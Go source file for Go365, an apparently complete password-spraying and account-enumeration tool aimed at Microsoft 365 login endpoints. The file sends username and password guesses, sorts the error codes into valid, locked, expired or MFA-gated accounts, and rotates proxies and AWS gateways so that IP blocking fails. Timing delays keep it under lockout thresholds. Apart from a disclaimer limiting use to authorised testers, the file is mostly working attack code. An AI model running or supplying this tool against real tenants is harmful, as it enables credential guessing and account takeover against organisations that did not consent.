/*
Go365
authors: paveway3, h0useh3ad, S4R1N, EatonChips
license: MIT
Copyright: None
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.
Version 2.0 - Added another endpoint. Fixed proxy logic. Fixed AWS logic (thanks h0useh3ad!!)
*/

package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"slices"
	"strings"
	"syscall"
	"time"

	"github.com/beevik/etree"
	"github.com/fatih/color"
	"golang.org/x/net/proxy"
	//"crypto/tls"                     dev: uncomment when testing through burp + proxifier
)

var (
	targetURL      = ""
	targetURLrst2  = "https://login.microsoftonline.com/rst2.srf"
	targetURLgraph = "https://login.microsoft.com/common/oauth2/token"
	debug          = false
	outFile        *os.File
	httpClient     *http.Client
	fireprox       bool
	fp             *FireProx
)

func exitFunc() {
	fmt.Println(color.RedString("\n[!] Exiting..."))
	if fireprox {
		fmt.Println(color.RedString("\n[!] Cleaning up AWS Gateway..."))
		// Do some cleanup
		err := fp.DeleteAPI()
		if err != nil {
			fmt.Println(color.RedString("[!] Error deleting API: " + err.Error()))
		}
	}
	os.Exit(1)
}

func doError(er ...string) {
	fmt.Println(strings.Join(er, "\n"))
	//exitFunc()
	os.Exit(1)
}

func doWritefile(content string) {

	formattedTime := time.Now().Format("02-01-2006 15:04:05.000")

	cleanContent := regexp.MustCompile(`\x1B\[[0-?9;]*[mK]`).ReplaceAllString(content, "")

	// Write the timestamped line and the command to the file

	outFile.WriteString(fmt.Sprintf("\n%s : %s", formattedTime, cleanContent))

}

// function to handle wait times
func wait(wt int) {
	waitTime := time.Duration(wt) * time.Second
	time.Sleep(waitTime)
}

// function to randomize the list of proxy servers
func randomProxy(proxies []string) string {
	var proxyString string

	// Select a random proxy server from the list provided
	if len(proxies) > 0 {
		proxyString = proxies[rand.Intn(len(proxies))]
	} else {
		return "bp" // No proxies available
	}

	// Test the connection using the selected proxy server
	dialSOCKSProxy, err := proxy.SOCKS5("tcp", proxyString, nil, proxy.Direct)
	if err != nil {
		fmt.Println(color.RedString("Error connecting to proxy: " + err.Error()))
		return "bp" // Return a fallback value
	}

	tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte("")))
	if err != nil {
		fmt.Println(color.RedString("Error creating request: " + err.Error()))
		return "bp"
	}

	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36")

	// Send the request
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(color.RedString("[!] Could not connect to proxy: " + proxyString))
		return "bp" // Return a fallback value
	}
	defer response.Body.Close() // Ensure the response body is closed after we're done

	return proxyString // Return the working proxy
}

type flagVars struct {
	flagHelp          bool
	flagEndpoint      string
	flagUsername      string
	flagUsernameFile  string
	flagDomain        string
	flagPassword      string
	flagPasswordFile  string
	flagUserPassFile  string
	flagDelay         int
	flagWaitTime      int
	flagProxy         string
	flagProxyFile     string
	flagOutFilePath   string
	flagAWSGatewayURL string
	flagDebug         bool
	flagcloud         string
	flagFireprox      bool
}

func flagOptions() *flagVars {
	flagHelp := flag.Bool("h", false, "")
	flagEndpoint := flag.String("endpoint", "", "")
	flagUsername := flag.String("u", "", "")
	flagUsernameFile := flag.String("ul", "", "")
	flagDomain := flag.String("d", "", "")
	flagPassword := flag.String("p", "", "")
	flagPasswordFile := flag.String("pl", "", "")
	flagUserPassFile := flag.String("up", "", "")
	flagDelay := flag.Int("delay", 3600, "")
	flagWaitTime := flag.Int("w", 1, "")
	flagProxy := flag.String("proxy", "", "")
	flagOutFilePath := flag.String("o", "", "")
	flagProxyFile := flag.String("proxyfile", "", "")
	flagAWSGatewayURL := flag.String("url", "", "")
	flagDebug := flag.Bool("debug", false, "")
	flagcloud := flag.String("cloud", "com", "")
	flagFireprox := flag.Bool("fireprox", false, "")
	flag.Parse()
	return &flagVars{
		flagHelp:          *flagHelp,
		flagEndpoint:      *flagEndpoint,
		flagUsername:      *flagUsername,
		flagUsernameFile:  *flagUsernameFile,
		flagDomain:        *flagDomain,
		flagPassword:      *flagPassword,
		flagPasswordFile:  *flagPasswordFile,
		flagUserPassFile:  *flagUserPassFile,
		flagDelay:         *flagDelay,
		flagWaitTime:      *flagWaitTime,
		flagProxy:         *flagProxy,
		flagProxyFile:     *flagProxyFile,
		flagOutFilePath:   *flagOutFilePath,
		flagAWSGatewayURL: *flagAWSGatewayURL,
		flagDebug:         *flagDebug,
		flagcloud:         *flagcloud,
		flagFireprox:      *flagFireprox,
	}
}

func doTheStuffGraph(un, pw, prox string) string {
	var returnString string
	client := &http.Client{}
	// Devs - uncomment this code if you want to skip cert validation (burp+proxifier)
	//client := &http.Client{
	//	Transport: &http.Transport{
	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
	//	},
	//}

	const client_id = "4345a7b9-9a63-4910-a426-35363201d503"

	requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=` + client_id + `&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
	// If a proxy was set, do this stuff
	if prox != "" {
		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
		if err != nil {
			doError(color.RedString("Error connecting to proxy."))
		}
		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
		client = &http.Client{
			Transport: tr,
			Timeout:   5 * time.Second,
		}
	}
	// Build http request
	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36")
	if err != nil {
		doError(color.RedString(err.Error()))
	}
	// Send http request
	response, err := client.Do(request)
	if err != nil {
		doError(color.RedString("[!] Could not connect to microsoftonline.com\n\n[!] Debug info below:", err.Error()))
	}
	defer response.Body.Close()
	// Read response
	body, err := io.ReadAll(response.Body)
	if err != nil {
		doError(color.RedString(err.Error()))
	}
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		doError(color.RedString(err.Error()))
	}

	x := fmt.Sprintf("%v", data["error_codes"])

	returnString = resStatus(un, pw, x)
	if debug {
		returnString = returnString + "\n" + x + "\n" + string(body)
	}
	return returnString
}

func doTheStuffRst(un, pw, prox string) string {
	var returnString string
	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + un + `</wsse:Username><wsse:Password>` + pw + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
	client := &http.Client{}
	// Devs - uncomment this code if you want to skip cert validation (burp+proxifier)
	//client := &http.Client{
	//	Transport: &http.Transport{
	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
	//	},
	//}

	// Build http request
	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36")
	if err != nil {
		doError(color.RedString(err.Error()))
	}
	// Set proxy if enabled
	if prox != "" {
		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
		if err != nil {
			doError(color.RedString("Error connecting to proxy."))
		}
		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
		client = &http.Client{
			Transport: tr,
			Timeout:   5 * time.Second, //set to 15 when done
		}
	}
	//Send http request
	response, err := client.Do(request)
	if err != nil {
		doError(color.RedString("[!] Could not connect to microsoftonline.com. Check your comms.\n\n[!] Debug info below:\n", err.Error()))
	}
	defer response.Body.Close()
	// Read response
	body, err := io.ReadAll(response.Body)
	if err != nil {
		doError(color.RedString(err.Error()))
	}
	// Parse response
	xmlResponse := etree.NewDocument()
	xmlResponse.ReadFromBytes(body)
	// Read response codes
	// looks for the "psf:text" field within the XML response
	x := xmlResponse.FindElement("//psf:text")
	returnString = resStatus(un, pw, x.Text())

	if debug {
		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
	}
	return returnString
}

func resStatus(un, pw string, status string) string {
	if len(status) == 0 {
		return color.GreenString("[+] Possible valid login! " + un + " : " + pw)
	} else if strings.Contains(status, "50126") {
		return color.YellowString("[-] Valid user, but invalid password: " + un + " : " + pw)
	} else if strings.Contains(status, "50055") {
		return color.MagentaString("[-] Valid user, expired password: " + un + " : " + pw)
	} else if strings.Contains(status, "50056") {
		return color.YellowString("[-] User exists, but unable to determine if the password is correct: " + un + " : " + pw)
	} else if strings.Contains(status, "50053") {
		return color.MagentaString("[-] Account locked out: " + un)
	} else if strings.Contains(status, "50057") {
		return color.MagentaString("[-] Account disabled: " + un)
	} else if strings.Contains(status, "50076") {
		return color.GreenString("[+] Possible valid login, MFA required. " + un + " : " + pw)
	} else if strings.Contains(status, "50079") {
		return color.GreenString("[+] Possible Valid login, user must enroll in MFA. " + un + " : " + pw)
	} else if strings.Contains(status, "53004") {
		return color.GreenString("[+] Possible valid login, user must enroll in MFA. " + un + " : " + pw)
	} else if strings.Contains(status, "50034") {
		return color.RedString("[-] User not found: " + un)
	} else if strings.Contains(status, "50059") {
		return color.RedString("[-] Domain not found in o365 directory. Exiting...")
	} else {
		return color.MagentaString("[!] Unknown response, run with -debug flag for more information. " + un + " : " + pw)
	}
}

// func init() {
// 	opt := flagOptions()
// }

func main() {
	var domain string
	var proxyList []string
	var usernameList []string
	var passwordList []string
	var err error

	info()

	rand.New(rand.NewSource(time.Now().UnixNano()))
	opt := flagOptions()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	// Run a goroutine to handle graceful shutdown
	go func() {
		<-signalChan // Wait for signal
		exitFunc()   // Call custom exit function
	}()

	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment, // Default to environment proxy if no flag provided
		// Bypass TLS verification for testing through Burp Suite
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	// -proxy
	if opt.flagProxy != "" {
		proxyList = append(proxyList, opt.flagProxy)
		proxyURL, err := url.Parse(opt.flagProxy)
		if err != nil || !slices.Contains([]string{"socks5", "http", "https"}, proxyURL.Scheme) {
			doError(color.RedString("Invalid proxy URL : " + proxyURL.String()))
		} else if proxyURL.Scheme == "socks5" {
			dialer, err := proxy.SOCKS5("tcp", proxyURL.Host, nil, proxy.Direct)
			if err != nil {
				log.Fatalf("Error creating SOCKS5 proxy dialer: %v", err)
			}
			transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dialer.Dial(network, addr)
			}
		} else if proxyURL.Scheme == "http" || proxyURL.Scheme == "https" {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
		fmt.Println(color.CyanString("[i] Optional proxy configured: " + opt.flagProxy))

		// Create the HTTP client with the transport and timeout
		httpClient = &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}
		os.Exit(0)
	}
	//-h
	if opt.flagHelp {
		doError(usage)
	}
	// -u
	if opt.flagUsername != "" {
		usernameList = append(usernameList, opt.flagUsername)
	} else if opt.flagUsernameFile == "" && opt.flagUserPassFile == "" {
		doError(usage, color.RedString("[!] Must provide a user. E.g. -u legituser, -ul ./user_list.txt, -up ./userpass_list.txt"))
	}
	// -ul
	if opt.flagUsernameFile != "" {
		// Open username file
		usernameFile, err := os.Open(opt.flagUsernameFile)
		if err != nil {
			doError(color.RedString(err.Error()))
		}
		defer usernameFile.Close()

		// Read username file
		scanner := bufio.NewScanner(usernameFile)
		for scanner.Scan() {
			usernameList = append(usernameList, strings.TrimSpace(scanner.Text()))
		}
		if err := scanner.Err(); err != nil {
			doError(color.RedString(err.Error()))
		}
	}

	// -d
	if opt.flagDomain != "" {
		// Modify lines to add @domain.com if it's not present
		for i := range usernameList {
			if !strings.HasSuffix(usernameList[i], domain) && !strings.Contains(usernameList[i], "@") {
				usernameList[i] += "@" + opt.flagDomain
			}
		}

	} else {
		doError(usage, color.RedString("[!] Must provide a domain. E.g. -d testdomain.com"))
	}

	// -p
	if opt.flagPassword != "" {
		passwordList = append(passwordList, opt.flagPassword)
	} else if opt.flagEndpoint != "user" && opt.flagPasswordFile == "" && opt.flagUserPassFile == "" {
		doError(usage, color.RedString("[!] Must provide a password to test. E.g. -p 'password123!', -pl ./password_list.txt, -up ./userpass_list.txt"))
	}
	// -pl
	if opt.flagPasswordFile != "" {
		// Open password file
		passwordFile, err := os.Open(opt.flagPasswordFile)
		if err != nil {
			doError(color.RedString(err.Error()))
		}
		defer passwordFile.Close()

		// Read password file
		scanner := bufio.NewScanner(passwordFile)
		for scanner.Scan() {
			passwordList = append(passwordList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			doError(color.RedString(err.Error()))
		}
	}
	// -up
	if opt.flagUserPassFile != "" {
		// Open userpass file
		userPassFile, err := os.Open(opt.flagUserPassFile)
		if err != nil {
			doError(color.RedString(err.Error()))
		}
		defer userPassFile.Close()

		// Read userpass file
		scanner := bufio.NewScanner(userPassFile)
		for scanner.Scan() {
			up := strings.Split(scanner.Text(), ":")
			if len(up) > 1 {
				usernameList = append(usernameList, up[0])
				passwordList = append(passwordList, up[1])
			}
		}
		if err := scanner.Err(); err != nil {
			doError(color.RedString(err.Error()))
		}
	}
	// -proxyfile
	if opt.flagProxyFile != "" {
		proxyFile, err := os.Open(opt.flagProxyFile)
		if err != nil {
			doError(color.RedString(err.Error()))
		}
		defer proxyFile.Close()

		scanner := bufio.NewScanner(proxyFile)
		for scanner.Scan() {
			proxyList = append(proxyList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			doError(color.RedString(err.Error()))
		}
		fmt.Println(color.CyanString("[i] Optional proxy file configured: " + opt.flagProxyFile))
	}
	// -o
	if opt.flagOutFilePath != "" {
		outFile, err = os.OpenFile(opt.flagOutFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			doError(color.RedString(err.Error()))
		}
		defer outFile.Close()
		doWritefile(strings.Join(os.Args, " "))
	}
	// -url
	if opt.flagAWSGatewayURL != "" {
		targetURL = opt.flagAWSGatewayURL
		_, err = http.Get(targetURL)
		if err != nil {
			doError(color.RedString("[!] Could not connect to AWS Gateway link provided: " + targetURL + "\n\n,[!] Debug info below:\n" + err.Error()))
		} else {
			fmt.Println(color.CyanString("[i] Optional AWS Gateway configured: " + targetURL))
		}
	}

	// -endpoint
	color.Set(color.FgCyan)
	switch {
	case opt.flagEndpoint == "user":
		doUser(usernameList, opt.flagDomain, opt.flagcloud)
		return
	case opt.flagEndpoint == "rst":
		fmt.Println("[i] Using the rst endpoint...")
		if opt.flagAWSGatewayURL != "" {
			fmt.Println("[i] Make sure your AWS Gateway (for the -url setting) is pointing to https://login.microsoftonline.com/rst2.srf")
			targetURL = opt.flagAWSGatewayURL
		} else {
			targetURL = targetURLrst2
		}

	case opt.flagEndpoint == "graph":
		fmt.Println("[i] Using the graph endpoint...")
		if opt.flagAWSGatewayURL != "" {
			fmt.Println("[i] Make sure your AWS Gateway (for the -url setting) is pointing to https://login.microsoft.com/common/oauth2/token")
			targetURL = opt.flagAWSGatewayURL
		} else {
			targetURL = targetURLgraph
		}

	default:
		doError(color.RedString("Specify a valid endpoint (-endpoint rst, graph or user)\n Maybe -h would be useful."))
		color.Unset()
		return // Exit if no valid endpoint was specified
	}
	color.Unset()

	if opt.flagFireprox {
		fireprox = true
		regions := []string{"us-east-1"}
		fp, err = NewFireProx(regions[0], "", targetURL)
		if err != nil {
			fmt.Println(color.RedString("[!] Error initializing FireProx: " + err.Error()))
			os.Exit(1)
		}
	}

	// -debug
	debug = opt.flagDebug

	//// Finally it starts happening
	// Iterate through passwords
	for i, pass := range passwordList {
		// Iterate through usernames
		for j := 0; j < len(usernameList); {
			user := usernameList[j]

			// Add domain if username doesn't already have one
			if !strings.Contains(user, "@") {
				user += domain
			}

			// If using userpass file, use corresponding password
			if opt.flagUserPassFile != "" {
				pass = passwordList[j]
			}

			result := ""
			proxyInput := ""

			if opt.flagProxyFile != "" || proxyList != nil {
				proxyInput = "bp"
				for {
					proxyInput = randomProxy(proxyList)
					if proxyInput != "bp" {
						break
					}
				}
			}

			// Call the appropriate function based on the endpoint
			if opt.flagEndpoint == "rst" {
				result = doTheStuffRst(user, pass, proxyInput)
			} else if opt.flagEndpoint == "graph" {
				result = doTheStuffGraph(user, pass, proxyInput)
			}

			// Check if the account is locked out
			if strings.Contains(result, "Account locked out") {
				usernameList = append(usernameList[:j], usernameList[j+1:]...)
				// No increment of j, as we've removed an item
				continue
			}
			// Write to file
			if opt.flagOutFilePath != "" {
				doWritefile(result)
			}

			// Wait between usernames
			if j < len(usernameList)-1 {
				wait(opt.flagWaitTime)
			}

			j++ // Increment j after processing the current user
		}

		// If using userpass file, exit loop
		if opt.flagUserPassFile != "" {
			break
		}
		// Wait between passwords
		if i < len(passwordList)-1 {
			fmt.Println(color.CyanString("[i] Delay set. Sleeping for a while (ー。ー) zzz"))
			wait(opt.flagDelay)
			fmt.Println("[i] Waking up.")
		}
	}
	// Remind user of output file
	if opt.flagOutFilePath != "" {
		fmt.Println(color.GreenString("[i] Output file located at: " + opt.flagOutFilePath))
	}
}
